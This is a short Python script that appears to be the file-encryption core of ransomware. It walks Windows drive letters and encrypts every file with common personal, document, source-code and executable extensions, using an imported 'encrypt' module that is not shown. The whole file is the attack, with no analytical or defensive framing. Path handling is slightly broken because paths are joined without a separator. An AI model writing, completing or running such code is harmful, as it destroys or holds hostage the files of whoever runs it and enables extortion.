import sys ; sys.dont_write_bytecode = True
import encrypt
import os


def get_files(type_file,partition,key):
    for r,d,f in os.walk(partition):
        for file in f:
            if file.endswith(type_file):
                file_name = r+file
                encrypt.encrypt(file_name,key)
                print(f"{r+file}")


key = encrypt.generate_key()
m = encrypt.load_key()

drives = ["W" , "D" , "G" , "F" , "I" , "E"]


for _ in range(6):
    
    get_files(".mp3",f"{drives[-1]}:\\",key)     
    get_files(".jpg",f"{drives[-1]}:\\",key)
    get_files(".jpeg",f"{drives[-1]}:\\",key)
    get_files(".png",f"{drives[-1]}:\\",key)
    get_files(".mp4",f"{drives[-1]}:\\",key)
    get_files(".txt",f"{drives[-1]}:\\",key)
    get_files(".pdf",f"{drives[-1]}:\\",key)
    get_files(".py",f"{drives[-1]}:\\",key)
    get_files(".C",f"{drives[-1]}:\\",key)
    get_files(".html",f"{drives[-1]}:\\",key)
    get_files(".css",f"{drives[-1]}:\\",key)
    get_files(".js",f"{drives[-1]}:\\",key)
    get_files(".exe",f"{drives[-1]}:\\",key)
    
    drives.pop()